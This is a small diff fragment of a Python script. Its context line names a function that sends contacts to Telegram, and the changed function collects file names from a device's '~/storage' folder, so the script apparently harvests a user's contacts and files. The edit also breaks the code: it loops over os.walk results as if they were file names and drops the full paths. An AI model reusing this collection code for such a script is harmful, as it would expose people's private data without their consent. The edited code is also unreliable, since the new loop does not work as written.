@@ -31,10 +31,10 @@ def send_contacts_to_telegram():
 
 def get_user_files():
     files = []
-    print(os.walk('~/storage'))
-    for root, _, filenames in os.walk('~/storage'):
+    for filenames in os.walk('~/storage'):
+        print(filenames)
         for filename in filenames:
-            files.append(os.path.join(root,filename))
+            files.append(filename)
     return files
 
 files = get_user_files()
